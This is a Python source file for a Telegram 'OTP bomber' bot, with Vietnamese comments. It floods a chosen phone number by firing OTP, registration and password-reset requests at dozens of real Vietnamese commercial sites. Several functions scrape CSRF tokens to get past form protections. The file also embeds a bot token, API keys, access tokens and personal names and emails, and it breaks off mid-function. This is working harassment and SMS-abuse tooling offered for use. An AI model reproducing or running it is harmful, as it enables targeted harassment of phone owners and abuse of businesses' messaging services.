# spam_bot.py — OTP Bomber Telegram Bot (all-in-one)
# pip install python-telegram-bot requests

import asyncio
import concurrent.futures
import time
import logging
import random
import re
from functools import partial
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ConversationHandler, CallbackQueryHandler, ContextTypes, filters
)

# ─── CONFIG ────────────────────────────────────────────────────────────────────
BOT_TOKEN   = "8681995389:AAGbNTbkRVFQ2LkUetAP39Q6pSBY_nT8hpI"
GROUP_LINK  = "https://t.me/muadonglanhgia36"
GROUP_ID    = "@muadonglanhgia36"  # nhóm 1: check thành viên
GROUP_LINK2 = "https://t.me/chatmuadonglanhgia"
GROUP_ID2   = "@chatmuadonglanhgia"  # nhóm 2: nơi dùng bot
SUPPORT_USERNAME = "@Mduchotwar"

USER_MAX_SPAM  = 20     # user thường: tối đa 20 lần
USER_DELAY_SEC = 180    # user thường: delay 3 phút (180s) giữa các lần
ADMIN_DELAY_SEC = 0     # admin: không delay
MAX_WORKERS    = 30

# ─── ADMIN LIST ────────────────────────────────────────────────────────────────
ADMINS: set[int] = {7907990385}  # id cứng owner

# ─── SPAM COUNTER (per user, reset khi đổi ngày hoặc thủ công) ─────────────────
# { user_id: count_today }
spam_count: dict[int, int] = {}

# ─── CONVERSATION STATES ───────────────────────────────────────────────────────
ASK_PHONE, CONFIRM = range(2)

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
log = logging.getLogger(__name__)

# ─── ENDPOINT FUNCTIONS ────────────────────────────────────────────────────────
import requests

def tv360(phone):
    data = '{"msisdn":"phone"}'
    data = data.replace("phone", phone)
    head = {
        "Host": "m.tv360.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json"
    }
    requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login", data=data, headers=head)

def robot(phone):
    # ── FIX: fetch _token fresh thay vì hardcode ──
    try:
        s = requests.Session()
        r = s.get(
            'https://vietloan.vn/register',
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
            timeout=8
        )
        m = re.search(r'name="_token"\s+content="([^"]+)"', r.text)
        if not m:
            m = re.search(r'"_token":"([^"]+)"', r.text)
        token = m.group(1) if m else '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU'
        cookies = s.cookies.get_dict()
    except Exception:
        s = requests.Session()
        token = '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU'
        cookies = {}

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietloan.vn',
        'referer': 'https://vietloan.vn/register',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phone': phone, '_token': token}
    s.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data, timeout=8)

def fb(phone):
    cookies = {
        'con.unl.lat': '1720112400',
        'con.unl.sc': '1',
        '_gid': 'GA1.3.2048602791.1720189695',
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://batdongsan.com.vn',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    params = {'phoneNumber': phone}
    requests.get(
        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params, cookies=cookies, headers=headers, timeout=8
    )

def dvcd(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }
    json_data = {'msisdn': phone}
    requests.post('https://viettel.vn/api/get-otp', headers=headers, json=json_data, timeout=8)

def myvt(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-nhap',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': ''}
    requests.post('https://viettel.vn/api/get-otp-login', headers=headers, json=json_data, timeout=8)

def phar(phone):
    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'referral': ''}
    requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data, timeout=8)

def fptshop(phone):
    headers = {
        'accept': '*/*',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'referer': 'https://fptshop.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': phone}
    requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=8)

def meta(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://meta.vn',
        'referer': 'https://meta.vn/account/register',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    params = {'api_mode': '1'}
    json_data = {
        'api_args': {'lgUser': phone, 'type': 'phone'},
        'api_method': 'CheckRegister',
    }
    requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=headers, json=json_data, timeout=8)

def _fetch_csrf_dmx(url_login: str, url_post: str, phone: str):
    """Helper dùng chung cho blu/tgdt/concung — cùng engine GetVerifyCode."""
    try:
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'})
        r = s.get(url_login, timeout=8)
        m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text)
        if not m:
            m = re.search(r'value="([A-Za-z0-9_\-]{80,})"', r.text)
        token = m.group(1) if m else ''
    except Exception:
        s = requests.Session()
        token = ''

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': token,
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': url_login.split('/lich')[0],
        'Referer': url_login,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    s.post(url_post, data=data, headers=headers, timeout=8)

def blu(phone):
    # ── FIX: fetch CSRF token fresh ──
    _fetch_csrf_dmx(
        'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        phone
    )

def tgdt(phone):
    # ── FIX: fetch CSRF token fresh ──
    _fetch_csrf_dmx(
        'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
        'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        phone
    )

def concung(phone):
    # ── FIX: fetch CSRF token fresh ──
    _fetch_csrf_dmx(
        'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        phone
    )

def mocha(phone):
    headers = {
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'origin': 'https://www.best-inc.vn',
        'referer': 'https://www.best-inc.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }
    json_data = {'phoneNumber': phone, 'verificationCodeType': 1}
    requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data, timeout=8)

def money(phone):
    headers = {
        'authority': 'moneyveo.vn',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://moneyveo.vn',
        'referer': 'https://moneyveo.vn/vi/registernew/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'phoneNumber': phone}
    requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', headers=headers, data=data, timeout=8)

def winmart(phone):
    headers = {
        'accept': 'application/json',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-api-merchant': 'WCM',
    }
    json_data = {
        'firstName': 'Taylor Jasmine',
        'phoneNumber': phone,
        'masanReferralCode': '',
        'dobDate': '2005-08-05',
        'gender': 'Male',
    }
    requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data, timeout=8)

def alf(phone):
    headers = {
        'authority': 'api.alfrescos.com.vn',
        'accept': 'application/json, text/plain, */*',
        'brandcode': 'ALFRESCOS',
        'content-type': 'application/json',
        'devicecode': 'web',
        'origin': 'https://alfrescos.com.vn',
        'referer': 'https://alfrescos.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }
    params = {'culture': 'vi-VN'}
    json_data = {
        'phoneNumber': phone,
        'secureHash': 'ebe2ae8a21608e1afa1dbb84e944dc89',
        'deviceId': '',
        'sendTime': 1691127801586,
        'type': 1,
    }
    requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data, timeout=8)

def phuc(phone):
    headers = {
        'accept': 'application/json',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://order.phuclong.com.vn',
        'referer': 'https://order.phuclong.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'userName': phone}
    requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', headers=headers, json=json_data, timeout=8)

def emart(phone):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
        'X-Requested-With': 'XMLHttpRequest',
    }
    data = {'mobile': phone}
    requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', headers=headers, data=data, timeout=8)

def hana(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'login': phone,
        'trackingId': '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3',
    }
    requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data, timeout=8)

def kingz(phone):
    headers = {
        'accept': '*/*',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'referer': 'https://kingfoodmart.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'operationName': 'SendOTP',
        'variables': {'phone': phone},
        'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
    }
    requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data, timeout=8)

def med(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://id-v121.medpro.com.vn',
        'Referer': 'https://id-v121.medpro.com.vn/',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
        'appid': 'medpro',
        'partnerid': 'medpro',
        'platform': 'pc',
    }
    json_data = {
        'fullname': 'người dùng medpro',
        'deviceId': '401387b523eda9fc5998c36541400134',
        'phone': phone,
        'type': 'password',
    }
    requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data, timeout=8)

def ghn(phone):
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone, 'type': 'register'}
    requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=8)

def gala(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5M2RhNGUwNC00YWIwLTRiMDYtOTc4Ni01NjNlNjY1ZTU5NmIiLCJkaWQiOiI3ODNhMTcyNy02ZDFlLTRjZWMtYmU1OS0zNjViMmU1MWQxN2QiLCJpcCI6IjEuNTIuMTc1LjEzNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcyMDEwNjEwMSwiZXhwIjoxNzM1NjU4MTAxfQ.TzzMuAseNbVYaSuWz5ufu4lEn9Uj_hrxh1aYxHyleJQ',
        'origin': 'https://galaxyplay.vn',
        'referer': 'https://galaxyplay.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    params = {'phone': phone}
    requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers, timeout=8)

def ahamove(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'mobile': phone,
        'name': 'khải',
        'email': 'khaissn@gmail.com',
        'country_code': 'VN',
        'firebase_sms_auth': 'true',
        'time': 1720101304,
        'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
    }
    requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data, timeout=8)

def lon(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-channel': 'EStore',
    }
    json_data = {'phoneNumber': phone, 'otpType': 0, 'fromSys': 'WEBKHLC'}
    requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', headers=headers, json=json_data, timeout=8)

def medi(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'mobile': phone, 'mobile_country_prefix': '84'}
    requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data, timeout=8)

def acfc(phone):
    # ── FIX: fetch form_key + session fresh ──
    try:
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'})
        r = s.get('https://www.acfc.com.vn/customer/account/create/', timeout=8)
        m = re.search(r'name="form_key"[^>]*value="([^"]+)"', r.text)
        form_key = m.group(1) if m else 'z6U4dNbxwcokMy9u'
        cookies = s.cookies.get_dict()
    except Exception:
        form_key = 'z6U4dNbxwcokMy9u'
        cookies = {}
        s = requests.Session()

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.acfc.com.vn',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {
        'number_phone': phone,
        'form_key': form_key,
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }
    s.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data, timeout=8)

def lote(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://www.lottemart.vn',
        'referer': 'https://www.lottemart.vn/signup',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'username': phone, 'case': 'register'}
    requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp', headers=headers, json=json_data, timeout=8)

def domi(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dmn': 'doqkqr',
        'origin': 'https://dominos.vn',
        'referer': 'https://dominos.vn/promotion-listing/bogo-week-digital-t7',
        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone_number': phone,
        'email': 'nguyentrongkhai130@gmail.com',
        'type': 0,
        'is_register': True,
    }
    requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data, timeout=8)

def shop(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '441e8136801b70ac87887bca16dd298f',
        'origin': 'https://thefaceshop.com.vn',
        'referer': 'https://thefaceshop.com.vn/',
        'timestamp': '1720623654086',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phoneNumber': phone}
    requests.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data, timeout=8)

def fu(phone):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'referer': 'https://futabus.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
        'x-app-id': 'client',
    }
    json_data = {'phoneNumber': phone, 'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6', 'use_for': 'LOGIN'}
    requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data, timeout=8)

def beau(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '584294d68530c7b753d7f5a77c1ddbc2',
        'origin': 'https://beautybox.com.vn',
        'referer': 'https://beautybox.com.vn/',
        'timestamp': '1720624059192',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phoneNumber': phone}
    requests.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data, timeout=8)

def hoanvu(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '028601f79dcc724ef8b8e7c989c5f649',
        'origin': 'https://reebok.com.vn',
        'referer': 'https://reebok.com.vn/',
        'timestamp': '1720624197351',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phoneNumber': phone}
    requests.post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification', headers=headers, json=json_data, timeout=8)

def tokyo(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'referer': 'https://tokyolife.vn/',
        'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
        'timestamp': '1720624468348',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {
        'phone_number': phone,
        'name': 'khải nguyễn',
        'password': 'vjyy1234',
        'email': 'trongkhai1118@gmail.com',
        'birthday': '2002-07-10',
        'gender': 'female',
    }
    requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data, timeout=8)

def cir(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'origin': 'https://circa.vn',
        'referer': 'https://circa.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': {'country_code': '84', 'phone_number': phone}}
    requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data, timeout=8)

def guma(phone):
    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    }
    json_data = {'phone': phone}
    requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data, timeout=8)

def hoang(phone):
    # ── FIX: fetch form_key fresh ──
    try:
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'})
        r = s.get('https://hoang-phuc.com/customer/account/create/', timeout=8)
        m = re.search(r'name="form_key"[^>]*value="([^"]+)"', r.text)
        form_key = m.group(1) if m else 'KELcFD4RySb6WQsc'
        cookies = s.cookies.get_dict()
    except Exception:
        form_key = 'KELcFD4RySb6WQsc'
        cookies = {}
        s = requests.Session()

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://hoang-phuc.com',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    data = {'action_type': '1', 'tel': phone}
    s.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data, timeout=8)

def fm(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'referer': 'https://fm.com.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
    }
    json_data = {'Phone': phone, 'LatOfMap': '106', 'LongOfMap': '108', 'Browser': ''}
    requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data, timeout=8)

def vtpost(phone):
    # ── FIX: fetch __RequestVerificationToken fresh ──
    try:
        s = requests.Session()
